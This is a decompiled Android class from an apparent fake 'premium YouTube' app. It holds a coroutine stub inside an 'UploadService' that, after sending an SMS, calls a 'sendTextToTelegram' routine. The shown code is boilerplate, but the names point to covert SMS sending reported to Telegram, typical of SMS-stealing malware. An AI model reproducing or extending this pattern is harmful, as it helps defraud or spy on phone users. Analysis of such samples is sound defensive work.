package com.w8sb.w8premiumyt;

import kotlin.Metadata;
import kotlin.ResultKt;
import kotlin.Unit;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.intrinsics.IntrinsicsKt;
import kotlin.coroutines.jvm.internal.DebugMetadata;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.functions.Function2;
import kotlinx.coroutines.CoroutineScope;

/* JADX INFO: compiled from: UploadService.kt */
/* JADX INFO: loaded from: /storage/emulated/0/Android/data/com.dastanapps.androiddevtools/files/decompiled/com.yt.phantombabar/dex/classes3.dex */
@Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
@DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$2", f = "UploadService.kt", i = {}, l = {3016}, m = "invokeSuspend", n = {}, s = {})
final class UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
    int label;
    final /* synthetic */ UploadService this$0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$2(UploadService uploadService, Continuation<? super UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$2> continuation) {
        super(2, continuation);
        this.this$0 = uploadService;
    }

    public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
        return new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$2(this.this$0, continuation);
    }

    public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
        return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
    }

    public final Object invokeSuspend(Object $result) {
        Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
        switch (this.label) {
            case 0:
                ResultKt.throwOnFailure($result);
                this.label = 1;
                if (UploadService.access$sendTextToTelegram(this.this$0, LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch1$when$try$funonReceive$class$nonameprovided$$valsentReceiver$try$funsendSmsAndNotify$classUploadService(), (Continuation) this) == coroutine_suspended) {
                    return coroutine_suspended;
                }
                break;
            case 1:
                ResultKt.throwOnFailure($result);
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return Unit.INSTANCE;
    }
}